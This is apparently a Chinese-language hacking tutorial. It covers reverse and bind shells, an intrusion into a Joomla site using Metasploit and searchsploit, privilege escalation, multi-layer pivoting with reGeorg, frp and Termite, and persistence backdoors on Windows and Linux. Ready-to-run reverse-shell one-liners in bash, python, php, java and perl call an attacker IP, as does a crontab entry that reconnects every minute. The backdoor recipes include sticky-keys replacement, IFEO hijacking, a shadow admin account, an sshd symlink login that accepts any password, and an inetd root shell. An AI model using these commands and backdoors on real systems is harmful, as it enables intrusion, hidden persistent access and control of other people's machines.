它可以用作端口监听、端口扫描、远程文件传输、远程shell等

* 语法:`nc [-hlnruz][-g 网关][-G 指向器数目][-i 延迟秒数][-o 输出文件][-p 通信端口][-s 来源IP][-v 次数][-w 超时秒数][主机名称][通信端口...]`

* 反向shell
  假设在目标主机找到了RCE漏洞，可以在目标主机上用nc发出命令启动反向shell
  ![](https://storage.tttang.com/media/attachment/2022/10/29/082a3402-fa0e-4082-8637-b1d5e8492103.png)

1. 在攻击机或vps上监听本地端口`nc -lvp 监听端口号`
2. 靶机命令，连接攻击机的监听端口`nc 攻击机ip 监听端口号 -e /bin/bash` #linux
   `nc 攻击机ip 监听端口号 -e c:\windows\system32\cmd.exe` #windows
   -e:将bash shell 发回主机

* 正向shell
  正向shell时在目标机使用nc将bash shell绑定到特定端口，攻击机nc连接到此端口
   ![](https://storage.tttang.com/media/attachment/2022/10/29/09a20387-a532-4ea8-9c1a-0c5c8a640cf9.png)

### **bash反弹shell**

目标主机可能没有nc或不支持-e参数时，就需要以下方式反弹shell

* 攻击机监听:`nc -lvvp 端口`
* 目标主机:`bash -i >& /dev/tcp/攻击机ip/监听端口号 0>&1`

>| bash -i          | 产生一个交互式shell                                          |
>| ---------------- | ------------------------------------------------------------ |
>| &                | 将&前后内容相结合重定向(>)至后者                             |
>| /dev/tcp/ip/port | 对socket网络连接的抽象                                       |
>| 0>&1             | 将标准输入和标准输入内容相结合，然后重定向至标准输出内容。0标准输入、1标准输出、2错误输出 |

## 其他反弹shell方式

### python反弹shell

```py
import soket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("攻击机IP",监听端口号));
os.dup(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);

```

### php反弹shell

```php
$sock=fsockopen("攻击机IP",监听端口);
exec("/bin/sh -i <&3 >&3 2>&3");
```

### java反弹shell

```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/攻击机ip/监听端口;cat <&5 | while read line;do $line 2>&5>&5;done"] as String[])
p.waitFor()

```

### perl 反弹shell

```perl
use Socket;
$i="攻击机IP地址";
$p=监听端口号;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){
(open(STDIN,">&S");
open(STDOUT,">&S");
open(STDERR,">&S");
exec("/bin/sh -i");
};
```

perl和python绝大多数服务器都会装，所以很有用

以某次内网渗透为实例

## 横向渗透预备工作

![](https://storage.tttang.com/media/attachment/2022/10/29/1636427f-bf91-4ce2-98da-c3c39213063f.png)假设是如上拓扑图。先无视防火墙，内网机器无法直接访问外网，必须要走边界机。

### 获得低权限shell

* 在网站信息搜集看到是joomla模板
* msf里search joomla **查看** 辅助模块auxiliar里的**扫描脚本**：`auxiliary/scannner/http/joomla_version`
* use脚本设置rhost参数，然后expolit运行可以看到网站版本。`expolit -j -z`挂后台
* `searchsplopit joomla 版本`**寻找exp**，最好是在exploit.db找，这里图个方便
* 把脚本copy到msf的exploits/multi/php目录下，然后reload
* use exp脚本，set rhost\rport参数和lhost\lport参数，set payload为reverse或者bind，exploit运行

目前获得了低权限shell，sessions进入shell

### 提权

* `uname -a`查看系统信息
* gcc --version看到有gcc，就找c语言的脚本。另起一个终端`nc --lvvp 端口`监听新端口
* shell里`bash -i >& /dev/tcp/xx.xx.xx.xx/端口 0>&1`反弹shell
* `searchspolit  linux kernel 内核版本 --exclute="(PoC)|/dos/"`搜索本地提权脚本。除去Poc和dos，就剩本地脚本了。同理，也可以在expolit.db上找
* 上传脚本，但是靶机的网站根目录不可写(很少见)，写到/tmp目录
* `gcc -o 输出文件名 脚本名`编译，`./文件名`运行。不行就换脚本，脚本里有使用方法，事先看一下

提不了就别提了，不是非要提权(试李妈半天都提不起，不知道这些exp谁写的)

### 一级代理

* 靶机`python reGeorgSocksProxy.py -u http://IP -p 代理端口`建立代理转发服务器
* ipconfig或者其他的看下网段，`run autoroute -s 网端`开启路由转发
* `use auxiliary/scanner/discovery`、nmap、ping扫描等扫同网端存活主机
* 扫描端口`use auxiliary/scanner/portscan/tcp`或者nmap扫，设置一下rhost和常用端口，运行
* `vim /etc/proxychains.conf`配置代理，浏览器开代理访问内网网站(建议foxyProxy插件)

如果开了80端口，接下来就是搞内网的站，拿内网的webshell。注意蚁剑和burpsuit等工具也要配置代理

**reGeorgSocksProxy指定的端口要和proxychains.conf文件里的端口一致**，因为这波操作的意义就是把边界机当作跳板，regeorgsocksproxy.py在边界机起到代理服务器的作用,proxychains就是客户端


内网的站打下来了重复上述步骤到提权。

### 二层内网渗透（bind）

* 生成msf木马`msfvenom -p windows/meterpreter/bind_tcp lport=xxx -f exe -o 文件名`，因为内网不能直接连外网的原因,reverse版木马无法使用，但是我们有代理可以连内网。上传
* 同理，生成了木马本地就需要有msf进程监听。`use exploit/multi/handler`，然后`set payload windows/meterpreter/bind_tcp`，payload和msf木马所用payload一致，设置参数lport和rhost.（这里开监听是在边界服务器开，也就是之前msf的边界服务器终端，lport当然也是边界机的端口，相当于~~本机msf对靶机边界机~~ 的渗透变为了==靶机边界机对内网二层机==)
* 在二层内网机提权运行msf木马拿到shell后，`run autoroute -s 另一内网网段`添加路由
* 扫描，老样子，那几个扫描用啥都行，`run arp_scanner -r 网段`进行arp扫描


如果非要用reverse的连接方式呢，今天我皮痒，或者有防火墙只能出。
很简单，用到端口转发。如果将边界机监听reverse的端口转发到本地端口，二层内网机reverse到边界机的端口就相当于直接和本地通信

lcx被检测概率太大，用**frp**

#### 二层内网渗透(frp工具reverse)

关于frp要分清楚客户端和服务端到底应该放在哪。具体可以看==frpc.ini==和==frps.ini==

比如某frpc.ini的内容

```
[common]
server_addr=172.16.12.2
server_port=7100
[ssh]
type=tcp
local_ip=127.0.0.1
local_port=5000
remote_port=5000
```

如上，客户端连接服务端的7000端口，是将本机的5000端口数据以tcp转发到172.16.12.2的5000端口。因为你开frp也需要端口的嘛。这样连接服务端的5000端口就相当于连接客户端的5000端口。
服务端只有两行，监听一下就行了

```
[common]
bind_port=7100
```

这里，我要强调本文的精华

#### ==frp端口转发与内网穿透==

![](https://storage.tttang.com/media/attachment/2022/10/29/f4087477-330a-4eef-acf2-0b6b27097858.png)

**还是这张图。对于外网kali访问内网机，有两种手法，一是把外网kali的端口转发至边界机的端口。这样数据发到边界机的该端口就相当于发到外网kali，而端口转发frps在边界机、frpc在外网kali。另一种方式是内网穿透，把内网流量直接穿透到外网使得内网机能上网，frps也在边界机，frpc在内网机。**

可以理解为都是端口转发，**访问frps所在主机就相当于访问frpc**，所以**frps一定要在中间的机器上**。逻辑理不通建议反复读来回读读通读透。有很多文章啊就不介绍端口转发和内网穿透有什么区别，整半天都不知道frps放哪，虽然只学内网穿透就够外网打内网一招鲜了。


上传frp和ini文件，运行。重新msfvenome生成一个reverse木马，lhost指向边界机 lport也是边界机要开的端口。(木马的lhost指的是需要连接的ip,不是指上传的ip)
上传木马到二层边界机运行，再在边界机shell里开监听(监听msf木马lport)


## 二层代理

* msf开二层代理，在刚在监听的shell里`use auxiliary/server/socks5`，然后`run`运行
* 对之前arp扫描的主机`use auxiliary/scanner/portscan/tcp`扫描端口，设置rhost参数，准备再往里打
* 配置浏览器代理，选socks5，端口和socks5脚本show options的端口一致
* 访问三层内网机的80端口，准备三层内网渗透(打80端口)

二层渗透就搞定了。如果三层内网要出网经过二层内网。用bind的话还好，用reverse就需要用两次代理转发


简单提一下**三层内网**，可以上传lcx再进行一次端口转发，把二层内网机的frp端口转发到边界机，或者走frp代理。这样都是frp端口就串起来了，再把三层内网机reverse到二层的端口等于二层转发的端口，相当于直接reverse出去

所以！多层代理就是把多层主机端口串起来！

什么？拿完shell，几台机子的shell来回切你嫌麻烦？可以直接用Termite工具

# Termite

Termite用于管理多层跳板，有admin和agent两个文件。

* 在第一个节点上传agent的对应版本，运行`./agent_版本 -l 端口`
* 在攻击机运行`admin的对应版本 -c 边界机ip -p 端口`，连接没问题就跳ok
* admin的shell里`goto 1`进入第一个节点，`shell 端口`。然后起个终端开nc或者其他监听，监听该端口，弹回了第一个shell
* 二层机器`agent对应版本 -c 上一层ip -p 上一层端口`。端口与前面开agent和admin的端口一致。


小站权限维持大部分还是靠webshell后门，其他的可以，但没必要。还有搞站最好别在晚上搞，晚上流量少，搞站日志记录和流量占比很大。因而写的好的木马流量控制做的很好，上传和下载速度都有控制

# 权限维持

权限维持不一定是高权限。后门最好都要伪装，如启动，图标，名字。经过学习个人认为权限维持=隐藏后门


## windows后门

常见的后门：shift后门，启动项/计划任务，映像劫持，影子账户，远控
大多数情况下，后门是一个隐藏进程。

* shift后门

>windows按五下shift后，windows就运行了system32下的sethc.exe，启动粘滞键。
>
>>将cmd.exe更名为sethc.exe并把原来的替换，之后连续按下5次shift后就会以system权限运行cmd.exe，之后只要利用cmd增加一个administator就可以登录

除此之外，连接上3389之后可以使用的功能不止shift，还有放大镜等可以替换。

* 映像劫持
  现在很难使用了，在高版本的windows版本中替换的文件受到了系统保护，所以要映像劫持。
  a.exe实际打开是b.exe，就是劫持

>映像劫持也称IFEO，是为一些在默认系统环境中运行时可能引发错误的程序执行提供特殊的环境设定。默认管理员有权读写
>
>>映像劫持的制作过程
>
>>1. 在注册表中新建一个项
>>    注册表位置`HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows NT/CurrentVersion/Image File Execution Options`
>>2. 程序中添加debugger键
>>3. 键值设置为恶意程序的路径

* 计划任务后门
  计划任务在win7及之前版本的操作系统中使用at命令，win8及之后使用schtasks命令

>创建计划任务基本命令: `schtask /create /t "chrom" /tr cmd.exe /sc minute /mo 1`
>上述命令的意思为创建一个计划任务名字为chrom，执行cmd.exe每分钟执行一次。执行后门就改指向文件和执行频率

* 注册表自启动后门

>制作过程
>
>>1. 打开注册表`HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/Run`
>>2. 添加键值REG_SZ
>>3. 数据中填运行程序路径

* 影子账户(杀毒能杀)
  顾名思义隐藏账户，只能通过注册表查看该用户。影子账户可以获得管理员权限且不易被发现

>制作过程
>
>>1. 创建隐藏账户
>>    创建隐藏账户只需在账户名后加\$符号，如`net user test$ 123 /add`
>>2. 修改并导出注册表
>
>>>* 注册表位置`HKEY_LOCAL_MACHINE/SAM/SAM/Domains/Account/Users/`，如进入SAM无法看到子选项，需要给administrators完全控制权限
>>>* 将administrator用户的F值复制到test\$对应F值，保存
>>>* 将test\$和users右键导出
>
>>3. 删除创建的隐藏用户
>>    cmd删除test\$`net user test$ /del`
>>4. 导入注册表
>>    双击导出的两个注册表

影子账户试了一下，还是很牛逼的。

## linux后门

* 计划任务后门(crontab后门)

>crontab命令介绍
>![](https://storage.tttang.com/media/attachment/2022/10/29/c4aaefea-6fc3-436f-b6fa-4773a2e3d455.png)
>* crontab命令用来管理用户需要周期执行的任务。等于windows计划任务。crond进程每分钟会定期检查是否有要执行的任务，如果有则自动执行
> 通常在计划任务中添加后门，或者替换服务进程，以及反弹shell
>
>* 反弹shell
>
>>1. 攻击机监听`nc -lvvp 本地端口号`、
>>2. 目标机中设置计划任务`crontab -e` 
>>    下列代码表示每分钟反弹一次shell到攻击机
>>    `*/1 * * * * bash -i >& /dev/tcp/攻击机外网ip/攻击机端口 0>&1`

* ssh公钥免密(常用)
  将客户端生成的ssh公钥写道目标服务器的 ~/.ssh/authorized_keys中，之后客户端利用私钥完成认证即可登录。该后门易被发现

>制作过程
>
>>1. 在攻击机上生成公钥私钥对
>>    `ssh-keygen -t rsa`
>
>>>在中途会让输入密钥对密码，如果需要免密登录则回车跳过
>
>>2. 将攻击机.ssh目录下的id_rsa.pub复制到目标服务器的`/root/.ssh/authorized_key`文件里
>>    `scp ~/.ssh/id_rsa.pub root@目标服务器IP地址:/root/.ssh/authorized_keys`
>>    ![](https://storage.tttang.com/media/attachment/2022/10/29/e20a4428-9299-4617-9f82-0bf3d3848656.png)
>>3. 在目标服务器中，将authorized_keys权限改为600
>>    `chmod 600 /root/.ssh/authorized.keys`
>>4. 尝试免密登录

详情请见ssh登录详解

* ssh软连接后门
  非常经典的后门，直接对sshd建立软连接，之后就能用任意密码登录

>软连接后门的原理是利用了**PAM配置**文件的作用，将sshd文件软连接名称设置为su，这样应用在**启动**过程中会去PAM配置文件夹中寻找是否存在对应名称的配置信息，su在pam_rootok检测uid 0即认证成功，也可以使用/**etc/pam.d中存在**的其他软连接名字

特点：1. 隐蔽性弱，rookit hunter这类防护脚本可以轻松扫到

2. 本地查看端口会暴露
3. 能绕过一些流量监控

>制作过程
>
>>1. 创建软连接 `ln -sf /usr/sbin/sshd /tmp/su`
>>2. 设置监听端口。因为本地查看端口容易暴露，建议设置8080，8081伪装 `/tmp/su -o Port=8080`
>>    运行/tmp/su就等于运行/usr/sbin/sshd,连不上可以nmap扫一下,有防火墙连不上

* inetd/xinetd后门(很老很老)
  监听外部网络请求(socket)的系统守护进程
  **具体工作过程**：当inetd收到一个外部请求后，会到配置文件中找到实际处理它的程序，在把socket交给那个程序处理

>inetd后门制作
>
>>1. 向/etc/inetd.conf文件中加入一行:`daytime stream tcp nowait root /bin/bash bash -i`
>>2. 开启inet后用nc连接:`nc -lvvp 目标ip 13`

还有prism后门等在服务器安装软件的，极易被发现
